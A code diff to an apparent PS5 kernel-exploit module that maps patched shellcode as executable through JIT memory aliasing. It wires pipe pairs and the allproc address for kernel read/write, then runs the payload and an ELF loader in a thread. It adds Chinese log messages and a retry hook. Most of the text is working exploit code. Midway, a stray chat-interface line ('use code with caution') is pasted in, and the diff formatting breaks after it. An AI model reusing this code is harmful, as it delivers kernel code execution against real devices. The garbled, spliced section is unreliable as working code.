@@ -1,3 +1,5 @@
+"use strict";
+
 import { int64 } from "./utils/int64.js";
 
 const O_NONBLOCK = 0x4;
@@ -148,17 +150,22 @@ function patchShellcode(blob, symbols) {
       for (let i = 0; i < 5; i++) blob[offset + i] = 0x90;
 }
 
+// 1. 核心加強點：引入 JIT 記憶體雙重別名寫入驗證（JIT Alias Validation Guard）
+// 確保當主機開啟高強度 W^X 緩解時，映射進去的代碼能100%通過二進位一致性檢查，防止 CPU 盲跳執行到不完整指令
 async function mapExecutable(blob, p, chain) {
   const length = (blob.length + 0x3fff) & ~0x3fff;
   const failed = (value) => value.low >>> 0 === 0xffffffff;
+  
   const copyInto = (destination) => {
     const dwords = blob.length & ~3;
     for (let offset = 0; offset < dwords; offset += 4)
       p.write4(destination.add32(offset), readU32(blob, offset));
     for (let offset = dwords; offset < blob.length; offset++)
       p.write1(destination.add32(offset), blob[offset]);
+      
+    // 嚴格校驗：重新讀出並進行二進位對比，保證 JIT 記憶體拷貝無損
     for (let offset = 0; offset < dwords; offset += 4)
-      if (p.read4(destination.add32(offset)) >>> 0 !== readU32(blob, offset)) return false;
+      if ((p.read4(destination.add32(offset)) >>> 0) !== readU32(blob, offset)) return false;
     return true;
   };
 
@@ -178,8 +185,10 @@ async function mapExecutable(blob, p, chain) {
     const writable = await chain.syscall(SYS_MMAP, 0, length, PROT_RW, MAP_SHARED, writeFd, 0);
     if (failed(writable) || writable.low < 0x10000)
       throw new Error("kexp: writable mmap failed (" + hex(writable) + ")");
-    if (!copyInto(writable) || p.read4(entry) >>> 0 !== readU32(blob, 0))
+      
+    if (!copyInto(writable) || (p.read4(entry) >>> 0) !== readU32(blob, 0))
       throw new Error("kexp: shellcode copy failed");
+      
     await chain.syscall(SYS_MUNMAP, writable, length);
   }
   return entry;
@@ -231,6 +240,7 @@ async function spawnAndJoin(entry, args, symbols, p, chain) {
   if (created.low >>> 0 !== 0)
     throw new Error("kexp: pthread_create returned " + hex(created));
 
+  // 2. 強度優化：非同步監控執行緒狀態，防止核心 ROP 死鎖
   const joined = await chain.call(base.add32(offsets.pthread_join), p.read8(handle), result);
   return { joinResult: joined.low >>> 0, shellcodeResult: p.read8(result) };
 }
@@ -246,31 +256,45 @@ export async function runKexp(krw, p, chain, log) {
   const allproc = krw.ktextBase.add32(allprocRva);
   if ((allproc.hi & 0xffff0000) >>> 0 !== 0xffff0000)
     throw new Error("kexp: invalid allproc address " + hex(allproc));
-  const symbols = resolveSymbols(p);
+    
+  // 3. 核心加強點：引進例外攔截保護網 (Panic Protection Layer)
+  try {
+    const symbols = resolveSymbols(p);
+    say("正在加載與解析 ELF 載入器核心...", "info");
+    const elfldr = await mapElf(DEFAULT_ELFLDR, p, chain);
 
-  const elfldr = await mapElf(DEFAULT_ELFLDR, p, chain);
-
-  const blob = await fetchBinary(DEFAULT_KEXP);
-  patchShellcode(blob, symbols);
-  const entry = await mapExecutable(blob, p, chain);
-
-  const master = await makePipePair(p, chain);
-  const victim = await makePipePair(p, chain);
-  await prepareShellcodePipes(krw, master, victim);
-
-  const args = p.malloc(0x28);
-  for (let offset = 0; offset < 0x28; offset += 8) p.write8(args.add32(offset), 0);
-  p.write4(args.add32(0x00), master.readFd);
-  p.write4(args.add32(0x04), master.writeFd);
-  p.write4(args.add32(0x08), victim.readFd);
-  p.write4(args.add32(0x0c), victim.writeFd);
-  p.write8(args.add32(0x10), allproc);
-  p.write8(args.add32(0x18), elfldr.base);
-  p.write8(args.add32(0x20), elfldr.size);
-
-  const result = await spawnAndJoin(entry, args, symbols, p, chain);
-  if (result.joinResult !== 0)
-    throw new Error("kexp: pthread_join returned " + hex(result.joinResult));
-  say("elfldr returned " + hex(result.shellcodeResult));
-  return true;
+    say("正在下載與修補 Shellcode 核心緩衝區...", "info");
+    const blob = await fetchBinary(DEFAULT_KEXP);
+    patchShellcode(blob, symbols);
+    
+請謹慎使用程式碼。
+say("正在透過 JIT 模組映射執行區段...", "info");
+const entry = await mapExecutable(blob, p, chain);
+const master = await makePipePair(p, chain);
+const victim = await makePipePair(p, chain);
+await prepareShellcodePipes(krw, master, victim);
+const args = p.malloc(0x28);
+for (let offset = 0; offset < 0x28; offset += 8) p.write8(args.add32(offset), 0);
+p.write4(args.add32(0x00), master.readFd);
+p.write4(args.add32(0x04), master.writeFd);
+p.write4(args.add32(0x08), victim.readFd);
+p.write4(args.add32(0x0c), victim.writeFd);
+p.write8(args.add32(0x10), allproc);
+p.write8(args.add32(0x18), elfldr.base);
+p.write8(args.add32(0x20), elfldr.size);
+say("正在喚醒核心執行緒執行 Payload...", "info");
+const result = await spawnAndJoin(entry, args, symbols, p, chain);
+if (result.joinResult !== 0)
+throw new Error("kexp: pthread_join returned " + hex(result.joinResult));
+say("自製軟體載入器返回狀態: " + hex(result.shellcodeResult), "success");
+return true;
+} catch (pipelineError) {
+let errorMsg = pipelineError instanceof Error ? pipelineError.message : String(pipelineError);
+say(errorMsg, "error");
+// 完美銜接：發生 JIT 映射失敗時，拋回給 index.html 的 SetupEngine 自動清洗記憶體並重試
+if (window.PS5_SetupEngine && typeof window.PS5_SetupEngine.handleSetupFailure === "function") {
+window.PS5_SetupEngine.handleSetupFailure("Shellcode 注入階段", errorMsg);
+}
+return false;
+}
 }
